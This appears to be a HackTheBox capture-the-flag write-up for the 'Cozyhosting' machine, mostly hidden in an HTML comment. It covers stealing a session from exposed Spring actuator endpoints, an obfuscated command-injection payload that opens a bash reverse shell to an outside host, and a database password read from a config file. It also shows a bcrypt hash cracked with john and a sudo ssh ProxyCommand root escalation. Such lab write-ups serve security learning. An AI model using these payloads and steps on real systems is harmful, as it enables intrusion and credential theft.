---
title: HTB - Cozyhosting
date: 2023-11-25
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, nmap, http, webserver, nginx, whatweb, wappalyzer, gobuster, dirsearch, cookies, burp-suite, jar, psql, postgres, hash, john, gtfobins]
img_path: /assets/htb/fullpwn/cozyhosting/
published: true
---

![room_banner](cozy_banner.png)

## Overview

|:-:|:-:|
|Machine|[Cozyhosting](https://app.hackthebox.com/machines/559)|
|Rank|Easy|
|Time|3h14m|
|Focus|Dir-busting, cookies|

> CONTENT HIDDEN - ACTIVE MACHINE!
{: .prompt-warning}

<!-- ## 1. Enumeration

```shell
# port scanning
sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 cozy

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Web Server Enum

```shell
# tech used
whatweb http://cozyhosting.htb

http://cozyhosting.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

```page-source
    <!-- =======================================================
    * Template Name: FlexStart
    * Updated: Mar 10 2023 with Bootstrap v5.2.3
    * Template URL: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ======================================================== --
```

```page-source-login
   <!-- =======================================================
    * Template Name: NiceAdmin
    * Updated: Mar 09 2023 with Bootstrap v5.2.3
    * Template URL: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ======================================================== --
```

<figure>
    <img src="wappalyzer.png"
    alt="Wappalyzer report" >
</figure>

```shell
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

```shell
dirsearch -u http://cozyhosting.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_cozyhosting.htb/__23-11-22_21-03-43.txt

Target: http://cozyhosting.htb/

[21:03:43] Starting:
[21:03:48] 200 -    0B  - /;/json
[21:03:48] 200 -    0B  - /;/login
[21:03:48] 200 -    0B  - /;json/
[21:03:48] 200 -    0B  - /;/admin
[21:03:48] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[21:03:48] 200 -    0B  - /;login/
[21:03:48] 200 -    0B  - /;admin/
[21:03:48] 400 -  435B  - /a%5c.aspx
[21:03:49] 200 -    0B  - /actuator/;/auditevents
[21:03:49] 200 -    0B  - /actuator/;/auditLog
[21:03:49] 200 -    0B  - /actuator/;/caches
[21:03:49] 200 -    0B  - /actuator/;/configurationMetadata
[21:03:49] 200 -    0B  - /actuator/;/env
[21:03:49] 200 -    0B  - /actuator/;/configprops
[21:03:49] 200 -    0B  - /actuator/;/events
[21:03:49] 200 -    0B  - /actuator/;/exportRegisteredServices
[21:03:49] 200 -    0B  - /actuator/;/healthcheck
[21:03:49] 200 -    0B  - /actuator/;/dump
[21:03:49] 200 -    0B  - /actuator/;/heapdump
[21:03:49] 200 -    0B  - /actuator/;/conditions
[21:03:49] 200 -    0B  - /actuator/;/beans
[21:03:49] 200 -    0B  - /actuator/;/health
[21:03:49] 200 -    0B  - /actuator/;/features
[21:03:49] 200 -    0B  - /actuator/;/httptrace
[21:03:49] 200 -    0B  - /actuator/;/info
[21:03:49] 200 -    0B  - /actuator/;/integrationgraph
[21:03:49] 200 -    0B  - /actuator/;/flyway
[21:03:49] 200 -    0B  - /actuator/;/jolokia
[21:03:49] 200 -    0B  - /actuator/;/liquibase
[21:03:49] 200 -    0B  - /actuator/;/logfile
[21:03:49] 200 -    0B  - /actuator/;/loggers
[21:03:49] 200 -    0B  - /actuator/;/loggingConfig
[21:03:49] 200 -    0B  - /actuator/;/metrics
[21:03:49] 200 -    0B  - /actuator/;/mappings
[21:03:49] 200 -    0B  - /actuator/;/prometheus
[21:03:49] 200 -    0B  - /actuator/;/scheduledtasks
[21:03:49] 200 -    0B  - /actuator/;/refresh
[21:03:49] 200 -    0B  - /actuator/;/registeredServices
[21:03:49] 200 -    0B  - /actuator/;/resolveAttributes
[21:03:49] 200 -    0B  - /actuator/;/releaseAttributes
[21:03:49] 200 -    0B  - /actuator/;/sessions
[21:03:49] 200 -    0B  - /actuator/;/ssoSessions
[21:03:49] 200 -    0B  - /actuator/;/shutdown
[21:03:49] 200 -    0B  - /actuator/;/sso
[21:03:49] 200 -    0B  - /actuator/;/springWebflow
[21:03:49] 200 -    0B  - /actuator/;/statistics
[21:03:49] 200 -    0B  - /actuator/;/threaddump
[21:03:49] 200 -    0B  - /actuator/;/trace
[21:03:49] 200 -    0B  - /actuator/;/status
[21:03:49] 200 -  245B  - /actuator/sessions
[21:03:49] 200 -  634B  - /actuator
[21:03:49] 200 -    5KB - /actuator/env
[21:03:49] 200 -  124KB - /actuator/beans
[21:03:49] 200 -   15B  - /actuator/health
[21:03:49] 200 -   10KB - /actuator/mappings
[21:03:49] 401 -   97B  - /admin
[21:03:49] 200 -    0B  - /admin/%3bindex/
[21:03:50] 200 -    0B  - /admin;/
[21:03:50] 200 -    0B  - /Admin;/
[21:03:56] 200 -    0B  - /axis//happyaxis.jsp
[21:03:56] 200 -    0B  - /axis2-web//HappyAxis.jsp
[21:03:56] 200 -    0B  - /axis2//axis2-web/HappyAxis.jsp
[21:04:00] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[21:04:04] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[21:04:04] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[21:04:04] 500 -   73B  - /error
[21:04:04] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[21:04:04] 200 -    0B  - /extjs/resources//charts.swf
[21:04:07] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[21:04:08] 200 -    0B  - /jkstatus;
[21:04:10] 200 -    4KB - /login
[21:04:10] 200 -    0B  - /login.wdm%2e
[21:04:11] 204 -    0B  - /logout

Task Completed
```

<figure>
    <img src="actuator_sessions.png"
    alt="actuator-sessions subdirectory" >
</figure>

> Change cookie value with Burp Suite.

<figure>
    <img src="logged_in.png"
    alt="Logging into the website" >
</figure>

# 3. Initial Foothold

<figure>
    <img src="burp_admin_execute-ssh.png"
    alt="Execute ssh function" >
</figure>

<figure>
    <img src="bash_error.png"
    alt="Bash response error" >
</figure>

<figure>
    <img src="execute_ssh_without_user.png"
    alt="SSH response info" >
</figure>

```shell
echo "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK
```

```shell
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

> URL encode key chars (`CTRL+U`) and send the above payload as the `username` param. 

```shell
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.230] 40406
bash: cannot set terminal process group (1064): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$
```

## 4. Lateral movement

> Stabilize shell.

```shell
app@cozyhosting:/app$ netstat -ltn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN

app@cozyhosting:/app$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:postgresql    0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 localhost:http-alt      [::]:*                  LISTEN
```

```shell
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar

# transfer file
app@cozyhosting:/app$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```shell
wget http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar
--2023-11-25 17:21:06--  http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar
Resolving cozyhosting.htb (cozyhosting.htb)... 10.10.11.230
Connecting to cozyhosting.htb (cozyhosting.htb)|10.10.11.230|:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’

cloudhosting-0.0.1.ja 100%[========================>]  57.47M  11.5MB/s    in 5.5s

2023-11-25 17:21:12 (10.5 MB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
```

```shell
ls
cloudhosting-0.0.1.jar

file cloudhosting-0.0.1.jar
cloudhosting-0.0.1.jar: Java archive data (JAR)

apropos cloudhosting-0.0.1.jar
cloudhosting-0.0.1.jar: nothing appropriate.
```

> [How to open JARs](https://www.makeuseof.com/jar-file-open-using-command-line/).

```shell
# check content
jar tf cloudhosting-0.0.1.jar
META-INF/
META-INF/MANIFEST.MF
org/
org/springframework/
org/springframework/boot/
org/springframework/boot/loader/
org/springframework/boot/loader/ClassPathIndexFile.class
org/springframework/boot/loader/ExecutableArchiveLauncher.class
org/springframework/boot/loader/JarLauncher.class
org/springframework/boot/loader/LaunchedURLClassLoader$DefinePackageCallType.class
org/springframework/boot/loader/LaunchedURLClassLoader$UseFastConnectionExceptionsEnumeration.class
org/springframework/boot/loader/LaunchedURLClassLoader.class
org/springframework/boot/loader/Launcher.class
org/springframework/boot/loader/MainMethodRunner.class
...
```

```shell
# extract file
jar xf cloudhosting-0.0.1.jar
ls
BOOT-INF  cloudhosting-0.0.1.jar  META-INF  org

┌──(kali㉿CSpanias)-[~/htb/cozyhosting/BOOT-INF/classes]
└─$ cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

```shell
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password for user postgres:
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

> Postgres [cheatsheet](https://postgrescheatsheet.com/#/databases).

```shell
# list databases
postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

# connect to cozyhosting database
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".

# list tables
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# select * from users;
 name | password | role
------+----------+-------
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

cozyhosting-# select * from hosts;
 id | username  |      hostname
----+-----------+--------------------
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande
(4 rows)
```

```shell
┌──(kali㉿CSpanias)-[~/htb/cozyhosting]
└─$ echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash

┌──(kali㉿CSpanias)-[~/htb/cozyhosting]
└─$ cat hash
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

> `$2a$` is [_blowfish_](https://www.baeldung.com/cs/des-vs-3des-vs-blowfish-vs-aes#3-blowfish).

```shell
┌──(kali㉿CSpanias)-[~/htb/cozyhosting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
1g 0:00:00:05 DONE (2023-11-25 18:00) 0.1814g/s 522.6p/s 522.6c/s 522.6C/s onlyme..soccer9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
app@cozyhosting:/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/fals
```

```shell
app@cozyhosting:/app$ su josh
Password:
# manchesterunited
josh@cozyhosting:/app$
josh@cozyhosting:/app$ cat ~/user.txt
1ce25812e75a54178b64f6258b0d83c6
```

## 5. Privilege escalation

```shell
josh@cozyhosting:/app$ sudo -l
[sudo] password for josh:
# manchesterunited
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

<figure>
    <img src="gtfobins_sudo_ssh.png"
    alt="GTFO Sudo ssh" >
</figure>

```shell
josh@cozyhosting:/app$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# cat ~/root.txt
07964e5398eaa692f7994088783567f3
```

## New things

1. [`dirsearch`](https://github.com/maurosoria/dirsearch)

2. White Label Error Page

    > _WhiteLabel Error Handling is a simple way to handle errors that is easy to customize. You can change the error pages that are displayed to users, and you can also configure the error code that is displayed and whether or not the stack trace is included._

    <figure>
        <img src="whitelabel_error_page.jpg"
        alt="White label error page" >
    </figure>

    <figure>
        <img src="spring_actuators_hacktricks.png"
        alt="White label error page" >
    </figure>

    > [Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

    The Spring Boot Framework includes a number of features called actuators to help you monitor and manage your web application when you push it to production. Intended to be used for auditing, health, and metrics gathering, they can also open a hidden door to your server when misconfigured.
    
    When a Spring Boot application is running, it automatically registers several endpoints (such as '/health', '/trace', '/beans', '/env' etc) into the routing process. For Spring Boot 1 - 1.4, they are accessible without authentication, causing significant problems with security. Starting with Spring version 1.5, all endpoints apart from '/health' and '/info' are considered sensitive and secured by default, but this security is often disabled by the application developers.
    
    The following Actuator endpoints could potentially have security implications leading to possible vulnerabilities:

    /dump - displays a dump of threads (including a stack trace)
    /trace - displays the last several HTTP messages (which could include session identifiers)
    /logfile - outputs the contents of the log file
    /shutdown - shuts the application down
    /mappings - shows all of the MVC controller mappings
    /env - provides access to the configuration environment
    /restart - restarts the application
    
    **For Spring 1x, they are registered under the root URL, and in 2x they moved to the "/actuator/" base path.**


3. URL key chars encoding:

    ```shell
    # 
    ;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

    # URL encoded
    %3b%65%63%68%6f%24%7b%49%46%53%25%3f%3f%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%4b%22%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%65%36%34%24%7b%49%46%53%25%3f%3f%7d%2d%64%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%68%3b%0a

    # URL key chars encoded
    %3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA%2bJjEK"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
    ```

4. Internal Field Separator (IFS) variable

    - [Bash IFS - What is the Internal Field Separator?](https://delightlylinux.wordpress.com/2020/02/16/bash-ifs-what-is-the-internal-field-separator/)
    - [Linux Shell - What is IFS?](https://www.theunixschool.com/2020/05/linux-shell-what-is-ifs.html)

5. JAR file manipulation

    - [How to Open a JAR File Using the Command Line](https://www.makeuseof.com/jar-file-open-using-command-line/) -->

<figure>
    <img src="cozy_pwned.png"
    alt="Cozy machine pwned" >
</figure>